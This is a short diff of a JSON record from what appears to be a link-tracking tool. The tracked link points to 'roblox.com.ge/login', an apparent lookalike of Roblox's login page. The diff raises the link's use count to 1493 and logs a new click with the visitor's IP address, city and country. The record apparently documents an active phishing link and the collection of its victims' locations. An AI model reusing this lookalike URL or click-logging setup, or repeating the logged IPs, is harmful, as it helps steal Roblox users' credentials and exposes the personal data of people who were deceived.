@@ -166,7 +166,7 @@
     "targetUrl": "https://roblox.com.ge/login?returnUrl=0920460288224362",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 1492,
+    "useCount": 1493,
     "createdBy": "admin",
     "clicks": [
       {
@@ -12104,6 +12104,14 @@
         "city": "Pendaleman",
         "flag": "🇮🇩",
         "countryCode": "ID"
+      },
+      {
+        "timestamp": 1777441453175,
+        "ip": "47.199.232.219",
+        "country": "United States",
+        "city": "Tampa",
+        "flag": "🇺🇸",
+        "countryCode": "US"
       }
     ]
   },
